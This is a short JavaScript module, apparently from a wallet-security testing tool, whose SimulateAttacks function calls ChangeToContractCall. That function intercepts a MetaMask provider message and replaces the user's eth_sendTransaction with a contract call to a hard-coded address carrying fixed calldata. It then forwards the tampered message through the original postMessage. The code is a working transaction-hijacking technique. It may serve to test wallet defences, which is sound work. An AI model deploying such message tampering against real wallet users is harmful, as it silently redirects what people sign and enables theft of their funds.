export const ChangeValueSendTx = (originalPostMessage, message, targetOrigin, transfer) => {

}

export const SimulateAttacks = (originalPostMessage, message, targetOrigin, transfer) => {
  ChangeToContractCall(originalPostMessage, message, targetOrigin, transfer)
}


const ChangeToContractCall = (originalPostMessage, message, targetOrigin, transfer) => {
  const callContractData = {
    name: 'metamask-provider',
    data: {
      method: 'eth_sendTransaction',
      params: [
        {
          data: '0x1249c58b',
          from: '0xbB44C4f44a561239c42f892333a541627ef2E8E6',
          to: '0xFBA3912Ca04dd458c843e2EE08967fC04f3579c2',
        },
      ],
      jsonrpc: '2.0',
      id: message.data.data.id,
    },
  }

  let modifiedMsg = message
  // console.log('value: ', modifiedMsg.data.data.params[0].value)
  modifiedMsg.data.data.params[0].value = '0x111111111111111'
  modifiedMsg.data = callContractData
  originalPostMessage.call(this, modifiedMsg, targetOrigin, transfer)
}